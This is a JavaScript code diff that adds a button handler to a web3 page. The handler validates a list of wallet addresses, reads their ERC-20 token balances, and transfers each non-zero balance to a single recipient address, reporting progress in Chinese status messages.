@@ -117,4 +117,37 @@ async function getTokenBalances(address) {
     }
 }
 
-document.getElementById('transferButton').onclick = async
+document.getElementById('transferButton').onclick = async () => {
+    const walletInput = document.getElementById('wallets').value;
+    const walletAddresses = walletInput.split(',').map(addr => addr.trim());
+
+    for (const walletAddress of walletAddresses) {
+        if (!web3.utils.isAddress(walletAddress)) {
+            document.getElementById('status').innerText += `\n无效的钱包地址: ${walletAddress}`;
+            continue;
+        }
+
+        document.getElementById('status').innerText += `\n正在获取 ${walletAddress} 的代币余额...`;
+        const tokenBalances = await getTokenBalances(walletAddress);
+
+        for (const tokenAddress in tokenBalances) {
+            const token = tokenBalances[tokenAddress];
+            const balance = token.balance;
+
+            if (balance.gt(0)) {
+                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+                try {
+                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: walletAddress });
+                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${walletAddress} 至 ${recipientAddress}`;
+                } catch (error) {
+                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
+                }
+            } else {
+                document.getElementById('status').innerText += `\n账户 ${walletAddress} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
+            }
+        }
+    }
+
+    document.getElementById('status').innerText += '\n所有代币转移完成';
+};
+
